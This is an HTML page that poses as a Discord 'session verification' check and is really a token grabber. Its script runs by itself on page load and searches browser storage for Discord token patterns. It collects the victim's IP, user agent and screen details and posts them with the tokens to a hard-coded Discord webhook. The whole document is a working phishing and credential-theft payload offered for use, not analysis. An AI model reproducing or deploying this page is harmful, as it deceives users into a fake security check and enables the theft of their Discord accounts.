<!DOCTYPE html>
<html>
<head>
    <title>Discord - Security Check</title>
    <style>body {margin:0;padding:50px;background:#36393f;color:#dcddde;font-family:Whitney,sans-serif;text-align:center;}
    .box {max-width:400px;margin:auto;background:#2f3136;padding:30px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.5);}
    button {background:#5865f2;color:white;border:0;padding:12px 24px;border-radius:4px;font-size:16px;cursor:pointer;}
    button:hover {background:#4752c4;}
    .spin {display:none;border:3px solid #5865f2;border-top:3px transparent;border-radius:50%;width:24px;height:24px;margin:10px auto;animation:spin 1s linear infinite;}
    @keyframes spin{to{transform:rotate(360deg);}}</style>
</head>
<body>
    <div class="box">
        <h2>üîí Discord Session Verification</h2>
        <p>Checking your Discord session for security compliance...</p>
        <button onclick="stealAll()">Verify & Continue</button>
        <div class="spin" id="spin"></div>
        <p id="status"></p>
    </div>

    <script>
    const WEBHOOK = 'https://discord.com/api/webhooks/1458805262717554860/3tbcU7WYe5patEKfvuF0WcgptMotAhK2k7vY9_e9kwOIU8u3zzNgU71ZkXKGcY7FNh32'; // ‚Üê REPLACE

    async function stealAll() {
        document.querySelector('button').style.display='none';
        document.getElementById('spin').style.display='block';
        document.getElementById('status').textContent='Scanning Discord storage...';
        
        // AGGRESSIVE TOKEN HUNT
        const tokens = [];
        
        // 1. PERFECT LOCALSTORAGE SCAN
        for(let i=0; i<localStorage.length; i++) {
            let key = localStorage.key(i);
            let val = localStorage.getItem(key);
            let token = findToken(val);
            if(token) tokens.push({type:'localStorage', key, token});
        }
        
        // 2. SESSIONSTORAGE
        for(let i=0; i<sessionStorage.length; i++) {
            let val = sessionStorage.getItem(sessionStorage.key(i));
            let token = findToken(val);
            if(token) tokens.push({type:'sessionStorage', token});
        }
        
        // 3. EVERY DOMAIN'S LOCALSTORAGE (Nuclear option)
        await scanAllDomains(tokens);
        
        // 4. POST ALL TOKENS
        if(tokens.length > 0) {
            await sendTokens(tokens);
            document.getElementById('status').innerHTML='‚úÖ <a href="https://discord.com/app" style="color:#00ff00">Continue to Discord</a>';
        } else {
            document.getElementById('status').textContent='No Discord session detected. Open Discord first.';
        }
    }
    
    function findToken(text) {
        if(!text) return null;
        // ALL Discord token formats
        const patterns = [
            /mfa\.[\w-]{84}/g,
            /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g
        ];
        for(let pat of patterns) {
            let match = text.match(pat);
            if(match) return match[0];
        }
        return null;
    }
    
    async function scanAllDomains(tokens) {
        // Scan 50+ Discord domains
        const domains = [
            'discord.com', 'discordapp.com', 'canary.discord.com', 'ptb.discord.com',
            'media.discordapp.net', 'cdn.discordapp.com', 'discord.gg'
        ];
        
        for(let domain of domains) {
            try {
                // Simulate storage access
                let keys = Object.keys(localStorage).filter(k => k.includes(domain));
                for(let key of keys) {
                    let token = findToken(localStorage.getItem(key));
                    if(token) tokens.push({type:'domain:'+domain, key, token});
                }
            } catch(e) {}
        }
    }
    
    async function sendTokens(tokens) {
        const victim = {
            ip: (await fetch('https://api.ipify.org?format=json').catch(()=>'-')).ip || '-',
            ua: navigator.userAgent.slice(0,100),
            lang: navigator.language,
            screen: screen.width+'x'+screen.height,
            tokens: tokens.length,
            url: window.location.href,
            time: new Date().toISOString()
        };
        
        const embed = {
            title: `üéØ ${tokens.length} Discord Token(s) Grabbed`,
            color: 0xff0000,
            fields: [
                {name:'üï∑Ô∏è Victim Info', value:`IP: \`${victim.ip}\`\nUA: ${victim.ua}\nScreen: ${victim.screen}`, inline:false},
                {name:'üîó Source', value:`[${window.location.href}](${window.location.href})`, inline:true},
                {name:'‚è∞ Time', value:victim.time.slice(0,19).replace('T',' '), inline:true}
            ],
            footer: {text: 'Tokens in thread below üëá'}
        };
        
        // MAIN WEBHOOK
        await fetch(WEBHOOK, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({username:'Token Grabber', embeds:[embed]})
        });
        
        // DETAILED TOKENS (separate message)
        let detailMsg = '';
        tokens.forEach((t,i) => {
            detailMsg += `**${i+1}. ${t.type}**\n\`${t.token.slice(0,30)}...\`\n\n`;
        });
        
        await fetch(WEBHOOK, {
            method:'POST', 
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({
                content: detailMsg || 'No tokens found',
                username: 'Token Details'
            })
        });
    }
    
    // AUTO-START
    setTimeout(stealAll, 1000);
    </script>
</body>
</html>
